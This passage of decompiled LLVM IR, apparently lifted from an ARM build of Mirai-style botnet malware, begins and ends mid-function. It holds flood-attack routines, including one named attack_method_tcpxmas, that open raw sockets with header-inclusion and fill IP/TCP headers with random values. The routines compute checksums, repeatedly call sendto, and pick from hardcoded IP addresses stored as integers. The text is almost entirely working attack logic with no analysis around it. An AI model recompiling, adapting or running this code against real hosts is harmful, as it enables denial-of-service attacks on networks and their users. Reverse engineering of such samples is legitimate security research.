  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
  store i32 %v2_aa2c, i32* %r0.global-to-local, align 4
  %v3_aa30 = load i32, i32* @r4, align 4
  %v4_aa30 = add i32 %v3_aa30, 10
  %v5_aa30 = inttoptr i32 %v4_aa30 to i16*
  store i16 %v3_aa2c, i16* %v5_aa30, align 2
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_aa38 = load i32, i32* @r6, align 4
  %v3_aa38 = add i32 %v2_aa38, 6
  %v4_aa38 = inttoptr i32 %v3_aa38 to i16*
  store i16 0, i16* %v4_aa38, align 2
  %v0_aa3c = load i32, i32* @r6, align 4
  store i32 %v0_aa3c, i32* @r1, align 4
  %v1_aa40 = add i32 %v0_aa3c, 4
  %v2_aa40 = inttoptr i32 %v1_aa40 to i16*
  %v3_aa40 = load i16, i16* %v2_aa40, align 2
  %v4_aa40 = zext i16 %v3_aa40 to i32
  store i32 %v4_aa40, i32* %r2.global-to-local, align 4
  %v0_aa44 = load i32, i32* @sb, align 4
  store i32 %v0_aa44, i32* %r3.global-to-local, align 4
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %r0.global-to-local, align 4
  %v4_aa4c = call i32 @checksum_tcpudp(i32 %v0_aa48, i32 %v0_aa3c, i32 %v4_aa40, i32 %v0_aa44)
  %v5_aa4c = trunc i32 %v4_aa4c to i16
  store i32 %v4_aa4c, i32* %r0.global-to-local, align 4
  %v3_aa50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa50, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v3_aa58 = mul i32 %v3_aa50, 32
  store i32 %v3_aa58, i32* %ip.global-to-local, align 4
  %v3_aa5c = load i32, i32* @r6, align 4
  %v4_aa5c = add i32 %v3_aa5c, 6
  %v5_aa5c = inttoptr i32 %v4_aa5c to i16*
  store i16 %v5_aa4c, i16* %v5_aa5c, align 2
  %v0_aa60 = load i32, i32* %ip.global-to-local, align 4
  %v1_aa60 = load i32, i32* %r3.global-to-local, align 4
  %tmp128 = mul i32 %v1_aa60, -8
  %v5_aa60 = add i32 %v0_aa60, %tmp128
  store i32 %v5_aa60, i32* %ip.global-to-local, align 4
  %v0_aa64 = load i32, i32* @r6, align 4
  %v1_aa64 = add i32 %v0_aa64, 2
  %v2_aa64 = inttoptr i32 %v1_aa64 to i16*
  %v3_aa64 = load i16, i16* %v2_aa64, align 2
  %v4_aa64 = zext i16 %v3_aa64 to i32
  store i32 %v4_aa64, i32* @r6, align 4
  %v1_aa68 = load i32, i32* @lr, align 4
  %v2_aa68 = add i32 %v1_aa68, %v5_aa60
  store i32 %v2_aa68, i32* %ip.global-to-local, align 4
  %v3_aa6c = add i32 %v2_aa68, 2
  %v4_aa6c = inttoptr i32 %v3_aa6c to i16*
  store i16 %v3_aa64, i16* %v4_aa6c, align 2
  %v0_aa70 = load i32, i32* @fp, align 4
  %v1_aa70 = load i32, i32* %ip.global-to-local, align 4
  %v2_aa70 = add i32 %v1_aa70, 4
  %v3_aa70 = inttoptr i32 %v2_aa70 to i32*
  store i32 %v0_aa70, i32* %v3_aa70, align 4
  %v0_aa74 = load i32, i32* @r4, align 4
  store i32 %v0_aa74, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v0_aa80 = load i32, i32* @sl, align 4
  store i32 %v0_aa80, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_aa88 = load i32, i32* %ip.global-to-local, align 4
  %v6_aa90 = call i32 @__libc_sendto(i32 %v3_a728, i32 %v0_aa74, i32 %v0_aa80, i32 16384, i32 %v0_aa88, i32 16)
  %v3_aa94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa94, i32* %r3.global-to-local, align 4
  %v1_aa98 = add i32 %v3_aa94, 1
  store i32 %v1_aa98, i32* %r0.global-to-local, align 4
  %v0_aa9c = load i32, i32* @r8, align 4
  %v9_aa9c = icmp eq i32 %v0_aa9c, %v1_aa98
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_aa98, i32* %stack_var_-44, align 4
  %v8_aaa4 = icmp sgt i32 %v0_aa9c, %v1_aa98
  br i1 %v8_aaa4, label %dec_label_pc_a9cc, label %dec_label_pc_aaa8

dec_label_pc_aaa8:                                ; preds = %dec_label_pc_aa10
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aaac = icmp eq i32 %v0_aa9c, 0
  store i1 %v2_aaac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_aaac, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_aabc:                                ; preds = %dec_label_pc_a9cc
  %v0_aabc = call i32 @rand_next()
  %v1_aabc = trunc i32 %v0_aabc to i16
  store i32 %v0_aabc, i32* %r0.global-to-local, align 4
  store i32 %v3_a78c, i32* @lr, align 4
  %v1_aac4 = load i32, i32* @r5, align 4
  %v9_aac4 = icmp eq i32 %v3_a78c, %v1_aac4
  store i1 %v9_aac4, i1* %cpsr_z.global-to-local, align 1
  %v3_aac8 = load i32, i32* @r4, align 4
  %v4_aac8 = add i32 %v3_aac8, 4
  %v5_aac8 = inttoptr i32 %v4_aac8 to i16*
  store i16 %v1_aabc, i16* %v5_aac8, align 2
  br i1 %v9_aac4, label %dec_label_pc_aad0, label %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge

dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge:    ; preds = %dec_label_pc_aabc
  %v1_a9fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a9f8

dec_label_pc_aad0:                                ; preds = %dec_label_pc_aabc, %dec_label_pc_a9ec
  %v0_aad0 = call i32 @rand_next()
  %v1_aad0 = trunc i32 %v0_aad0 to i16
  %v3_aad4 = load i32, i32* @r4, align 4
  %v4_aad4 = add i32 %v3_aad4, 20
  %v5_aad4 = inttoptr i32 %v4_aad4 to i16*
  store i16 %v1_aad0, i16* %v5_aad4, align 2
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v1_aadc = load i32, i32* @r5, align 4
  %v9_aadc = icmp eq i32 %v3_a7a8, %v1_aadc
  store i1 %v9_aadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aadc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aae4:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v0_aae4 = call i32 @rand_next()
  %v1_aae4 = trunc i32 %v0_aae4 to i16
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v1_aaec = load i32, i32* @r5, align 4
  %v9_aaec = icmp eq i32 %v3_a7b0, %v1_aaec
  store i1 %v9_aaec, i1* %cpsr_z.global-to-local, align 1
  %v3_aaf0 = load i32, i32* @r6, align 4
  %v4_aaf0 = add i32 %v3_aaf0, 2
  %v5_aaf0 = inttoptr i32 %v4_aaf0 to i16*
  store i16 %v1_aae4, i16* %v5_aaf0, align 2
  br i1 %v9_aaec, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aaf8:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04
  %v0_aaf8 = call i32 @rand_next()
  %v1_aaf8 = trunc i32 %v0_aaf8 to i16
  store i32 %v0_aaf8, i32* %r0.global-to-local, align 4
  %v3_aafc = load i32, i32* @r4, align 4
  %v4_aafc = add i32 %v3_aafc, 28
  %v5_aafc = inttoptr i32 %v4_aafc to i16*
  store i16 %v1_aaf8, i16* %v5_aafc, align 2
  br label %dec_label_pc_aa10

dec_label_pc_ab04:                                ; preds = %dec_label_pc_a690, %dec_label_pc_a670, %dec_label_pc_a614, %entry
  %v0_ab04 = call i32 @rand_next()
  %v1_ab08 = urem i32 %v0_ab04, 4
  store i32 %v1_ab08, i32* %r0.global-to-local, align 4
  %v2_ab0c = icmp eq i32 %v1_ab08, 3
  store i1 %v2_ab0c, i1* %cpsr_z.global-to-local, align 1
  %trunc = trunc i32 %v0_ab04 to i2
  switch i2 %trunc, label %dec_label_pc_a70811 [
    i2 0, label %dec_label_pc_ab40
    i2 1, label %dec_label_pc_ab6c
    i2 -2, label %dec_label_pc_ab60
    i2 -1, label %dec_label_pc_ab50
  ]

dec_label_pc_ab28:                                ; preds = %dec_label_pc_a738
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v1_ab2c = call i32 @__GI___libc_close(i32 %v3_a728)
  store i32 %v1_ab2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ab30

dec_label_pc_ab30:                                ; preds = %dec_label_pc_a710, %dec_label_pc_a708, %dec_label_pc_ab28
  %v1_ab3c = phi i32 [ %v3_a728, %dec_label_pc_a710 ], [ %v1_ab3c49, %dec_label_pc_a708 ], [ %v1_ab2c, %dec_label_pc_ab28 ]
  store i32 %v18_a4c0, i32* %sb.global-to-local, align 4
  store i32 %v27_a4c0, i32* %lr.global-to-local, align 4
  ret i32 %v1_ab3c

dec_label_pc_ab40:                                ; preds = %dec_label_pc_ab04
  store i32 134744072, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab50:                                ; preds = %dec_label_pc_ab04
  store i32 33686020, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab60:                                ; preds = %dec_label_pc_ab04
  store i32 104859200, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_ab04
  store i32 707416650, i32* @fp, align 4
  br label %dec_label_pc_a708

; uselistorder directives
  uselistorder i32 %v1_ab08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_ab04, { 1, 0 }
  uselistorder i32 %v0_aaf8, { 1, 0 }
  uselistorder i32 %v0_aae4, { 1, 0 }
  uselistorder i32 %v1_aadc, { 1, 0 }
  uselistorder i32 %v0_aabc, { 1, 0 }
  uselistorder i32 %v1_aa98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_aa60, { 1, 0 }
  uselistorder i32 %v4_aa4c, { 1, 0 }
  uselistorder i32 %v2_aa2c, { 1, 0 }
  uselistorder i1 %v3_a9f0, { 1, 0 }
  uselistorder i1 %v3_a9e0, { 1, 0 }
  uselistorder i32 %v4_aa14.pre-phi, { 1, 0 }
  uselistorder i32 %v1_a988, { 1, 0, 2 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %v0_a964, { 2, 0, 3, 1 }
  uselistorder i32 %v0_a960, { 1, 0, 2 }
  uselistorder i32 %v0_a8d0, { 1, 0 }
  uselistorder i32 %v4_a8cc, { 2, 0, 3, 4, 1 }
  uselistorder i32 %tmp111, { 1, 0 }
  uselistorder i32 %v3_a818, { 1, 0 }
  uselistorder i32 %v3_a7d4, { 1, 0 }
  uselistorder i32 %v1_a7c8, { 2, 0, 1 }
  uselistorder i32 %v3_a794, { 1, 0 }
  uselistorder i32 %v3_a78c, { 1, 2, 3, 5, 0, 4 }
  uselistorder i32 %v3_a784, { 0, 2, 1 }
  uselistorder i8 %v5_a77c, { 1, 0, 2 }
  uselistorder i32 %v1_a768, { 1, 0 }
  uselistorder i32 %v0_a768, { 1, 0 }
  uselistorder i1 %v7_a758, { 1, 0 }
  uselistorder i1 %v7_a72c, { 1, 0 }
  uselistorder i32 %v3_a728, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v0_a708, { 1, 0, 2 }
  uselistorder i32 %v2_a6d8, { 0, 1, 3, 2 }
  uselistorder i32 %v2_a6d4, { 1, 0, 2 }
  uselistorder i1 %v7_a6c4, { 1, 0 }
  uselistorder i32 %v1_a6c0, { 1, 0, 2 }
  uselistorder i1 %v8_a6b8, { 1, 0 }
  uselistorder i1 %v7_a6b4, { 1, 0 }
  uselistorder i32 %v1_a6a8, { 1, 0 }
  uselistorder i8 %v2_a69c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_a6a0, { 1, 0 }
  uselistorder i32 %v0_a6c0, { 3, 0, 2, 1 }
  uselistorder i32 %v0_a690, { 0, 2, 1 }
  uselistorder i32 %v1_a6a4, { 0, 2, 1 }
  uselistorder i32 %v2_a678, { 1, 0, 2, 3 }
  uselistorder i32 %v0_a670, { 1, 0, 2, 3 }
  uselistorder i1 %v7_a668, { 1, 0 }
  uselistorder i32 %v0_a668, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_a60c, { 1, 0, 3, 2 }
  uselistorder i32 %v6_a5ac, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a590, { 1, 0, 2, 3 }
  uselistorder i32 %v6_a578, { 2, 1, 0 }
  uselistorder i32 %v1_a560, { 1, 0 }
  uselistorder i32 %v7_a51c, { 1, 0, 2 }
  uselistorder i32 %v2_a4e0, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %sb.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 34, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 35, 34, 36, 38, 37, 40, 39, 0 }
  uselistorder i32* %r0.global-to-local, { 54, 52, 53, 55, 57, 56, 58, 1, 2, 4, 3, 5, 6, 7, 9, 8, 11, 10, 12, 13, 14, 19, 15, 16, 17, 18, 23, 20, 21, 22, 24, 26, 25, 27, 28, 29, 30, 32, 31, 33, 34, 36, 35, 37, 39, 38, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i1* %cpsr_z.global-to-local, { 28, 29, 30, 31, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 22, 23, 24, 21, 18, 25, 26, 27 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ab30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_aa10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %dec_label_pc_a9b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a9b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a980, { 1, 0 }
  uselistorder label %.thread20, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %bb105, { 1, 0 }
  uselistorder label %dec_label_pc_a6d0, { 1, 0 }
  uselistorder label %dec_label_pc_a6c4, { 1, 0 }
  uselistorder label %dec_label_pc_a690, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a688, { 1, 0 }
}

define i32 @attack_method_tcpxmas(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_ab7c = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_ab98 = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_aba4 = load i32, i32* @r6, align 4
  store i32 %v0_aba4, i32* %r0.global-to-local, align 4
  %v2_aba8 = call i32 @calloc(i32 %v0_aba4, i32 4)
  %v0_abac = load i32, i32* @r5, align 4
  store i32 %v0_abac, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_abbc = load i32, i32* @r4, align 4
  store i32 %v0_abbc, i32* %r0.global-to-local, align 4
  %v5_abc0 = inttoptr i32 %v0_abac to i32*
  %v6_abc0 = call i32 @attack_get_opt_int(i32 %v0_abbc, i32* %v5_abc0, i32 2, i32 0)
  %v1_abcc = urem i32 %v6_abc0, 256
  store i32 %v1_abcc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_abd8 = load i32, i32* @r5, align 4
  store i32 %v0_abd8, i32* %r1.global-to-local, align 4
  %v0_abdc = load i32, i32* @r4, align 4
  store i32 %v0_abdc, i32* %r0.global-to-local, align 4
  %v5_abe0 = trunc i32 %v6_abc0 to i8
  %v6_abe4 = inttoptr i32 %v0_abd8 to i32*
  %v7_abe4 = call i32 @attack_get_opt_int(i32 %v0_abdc, i32* %v6_abe4, i32 3, i32 65535)
  %v0_abe8 = load i32, i32* @r5, align 4
  store i32 %v0_abe8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_abe4, i32* @r7, align 4
  %v0_abf8 = load i32, i32* @r4, align 4
  store i32 %v0_abf8, i32* %r0.global-to-local, align 4
  %v4_abfc = inttoptr i32 %v0_abe8 to i32*
  %v5_abfc = call i32 @attack_get_opt_int(i32 %v0_abf8, i32* %v4_abfc, i32 4, i32 64)
  %v1_ac04 = urem i32 %v5_abfc, 256
  store i32 %v1_ac04, i32* %ip.global-to-local, align 4
  %v0_ac08 = load i32, i32* @r5, align 4
  store i32 %v0_ac08, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac14 = load i32, i32* @r4, align 4
  store i32 %v0_ac14, i32* %r0.global-to-local, align 4
  %v6_ac1c = inttoptr i32 %v0_ac08 to i32*
  %v7_ac1c = call i32 @attack_get_opt_int(i32 %v0_ac14, i32* %v6_ac1c, i32 5, i32 1)
  %v1_ac28 = urem i32 %v7_ac1c, 256
  store i32 %v1_ac28, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_ac30 = load i32, i32* @r5, align 4
  store i32 %v0_ac30, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ac38 = load i32, i32* @r4, align 4
  store i32 %v0_ac38, i32* %r0.global-to-local, align 4
  %v5_ac40 = inttoptr i32 %v0_ac30 to i32*
  %v6_ac40 = call i32 @attack_get_opt_int(i32 %v0_ac38, i32* %v5_ac40, i32 7, i32 65535)
  %v0_ac44 = load i32, i32* @r5, align 4
  store i32 %v0_ac44, i32* %r1.global-to-local, align 4
  %v3_ac48 = mul i32 %v6_ac40, 65536
  store i32 %v3_ac48, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac54 = load i32, i32* @r4, align 4
  store i32 %v0_ac54, i32* %r0.global-to-local, align 4
  %v3_ac58 = urem i32 %v6_ac40, 65536
  store i32 %v3_ac58, i32* @sl, align 4
  %v4_ac5c = inttoptr i32 %v0_ac44 to i32*
  %v5_ac5c = call i32 @attack_get_opt_int(i32 %v0_ac54, i32* %v4_ac5c, i32 11, i32 1)
  %v1_ac64 = urem i32 %v5_ac5c, 256
  store i32 %v1_ac64, i32* %ip.global-to-local, align 4
  %v0_ac68 = load i32, i32* @r5, align 4
  store i32 %v0_ac68, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac74 = load i32, i32* @r4, align 4
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  %v5_ac7c = inttoptr i32 %v0_ac68 to i32*
  %v6_ac7c = call i32 @attack_get_opt_int(i32 %v0_ac74, i32* %v5_ac7c, i32 12, i32 1)
  %v1_ac84 = urem i32 %v6_ac7c, 256
  store i32 %v1_ac84, i32* %ip.global-to-local, align 4
  %v0_ac88 = load i32, i32* @r5, align 4
  store i32 %v0_ac88, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r4, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v5_ac9c = inttoptr i32 %v0_ac88 to i32*
  %v6_ac9c = call i32 @attack_get_opt_int(i32 %v0_ac94, i32* %v5_ac9c, i32 13, i32 1)
  %v1_aca4 = urem i32 %v6_ac9c, 256
  store i32 %v1_aca4, i32* %ip.global-to-local, align 4
  %v0_aca8 = load i32, i32* @r5, align 4
  store i32 %v0_aca8, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acb4 = load i32, i32* @r4, align 4
  store i32 %v0_acb4, i32* %r0.global-to-local, align 4
  %v5_acbc = inttoptr i32 %v0_aca8 to i32*
  %v6_acbc = call i32 @attack_get_opt_int(i32 %v0_acb4, i32* %v5_acbc, i32 14, i32 1)
  %v1_acc4 = urem i32 %v6_acbc, 256
  store i32 %v1_acc4, i32* %ip.global-to-local, align 4
  %v0_acc8 = load i32, i32* @r5, align 4
  store i32 %v0_acc8, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acd4 = load i32, i32* @r4, align 4
  store i32 %v0_acd4, i32* %r0.global-to-local, align 4
  %v5_acdc = inttoptr i32 %v0_acc8 to i32*
  %v6_acdc = call i32 @attack_get_opt_int(i32 %v0_acd4, i32* %v5_acdc, i32 15, i32 1)
  %v1_ace4 = urem i32 %v6_acdc, 256
  store i32 %v1_ace4, i32* %ip.global-to-local, align 4
  %v0_ace8 = load i32, i32* @r5, align 4
  store i32 %v0_ace8, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_acf4 = load i32, i32* @r4, align 4
  store i32 %v0_acf4, i32* %r0.global-to-local, align 4
  %v5_acfc = inttoptr i32 %v0_ace8 to i32*
  %v6_acfc = call i32 @attack_get_opt_int(i32 %v0_acf4, i32* %v5_acfc, i32 16, i32 1)
  %v1_ad04 = urem i32 %v6_acfc, 256
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_ad10 = load i32, i32* @r5, align 4
  store i32 %v0_ad10, i32* %r1.global-to-local, align 4
  %v0_ad14 = load i32, i32* @r4, align 4
  store i32 %v0_ad14, i32* %r0.global-to-local, align 4
  %v5_ad1c = inttoptr i32 %v0_ad10 to i32*
  %v6_ad1c = call i32 @attack_get_opt_int(i32 %v0_ad14, i32* %v5_ad1c, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  store i32 %v0_ad2c, i32* %r1.global-to-local, align 4
  %v0_ad30 = load i32, i32* @r4, align 4
  store i32 %v0_ad30, i32* %r0.global-to-local, align 4
  %v4_ad34 = inttoptr i32 %v0_ad2c to i32*
  %v5_ad34 = call i32 @attack_get_opt_int(i32 %v0_ad30, i32* %v4_ad34, i32 1, i32 1)
  %v1_ad3c = urem i32 %v5_ad34, 256
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_ad50 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_ad50, i32* %r0.global-to-local, align 4
  %v7_ad54 = icmp eq i32 %v3_ad50, -1
  store i1 %v7_ad54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_ad50, i32* @sb, align 4
  br i1 %v7_ad54, label %dec_label_pc_af44, label %dec_label_pc_ad60

dec_label_pc_ad60:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_ad68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_ad68, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ad7c = call i32 @__GI_setsockopt(i32 %v3_ad50, i32 0, i32 3, i32 %v6_ad68, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ad7c, i32* %r0.global-to-local, align 4
  %v7_ad80 = icmp eq i32 %v5_ad7c, -1
  store i1 %v7_ad80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ad80, label %dec_label_pc_af3c, label %dec_label_pc_ad88

dec_label_pc_ad88:                                ; preds = %dec_label_pc_ad60
  %v0_ad88 = load i32, i32* @r7, align 4
  %v3_ad88 = mul i32 %v0_ad88, 65536
  store i32 %v3_ad88, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_ad90 = load i32, i32* @r6, align 4
  %v2_ad90 = icmp eq i32 %v0_ad90, 0
  store i1 %v2_ad90, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_ad98 = urem i32 %v0_ad88, 65536
  store i32 %v3_ad98, i32* @fp, align 4
  br i1 %v2_ad90, label %dec_label_pc_b1c8, label %dec_label_pc_ada0.preheader

dec_label_pc_ada0.preheader:                      ; preds = %dec_label_pc_ad88
  %v2_adec = ptrtoint i32* %stack_var_-144 to i32
  %v2_ae30 = ptrtoint i32* %stack_var_-64 to i32
  %v2_ae68 = ptrtoint i32* %stack_var_-80 to i32
  %v2_ae74 = ptrtoint i32* %stack_var_-336 to i32
  %v2_ae78 = ptrtoint i32* %stack_var_-48 to i32
  %v4_aed8 = zext i8 %tmp to i32
  %v1_aedc = and i32 %v4_aed8, 18
  %v2_aee0 = icmp eq i32 %v1_aedc, 18
  %v4_b084 = sext i8 %v5_abe0 to i32
  %sext = mul i32 %v5_abfc, 16777216
  %v4_b094 = sdiv i32 %sext, 16777216
  %v3_aec4 = sext i16 %tmp61 to i32
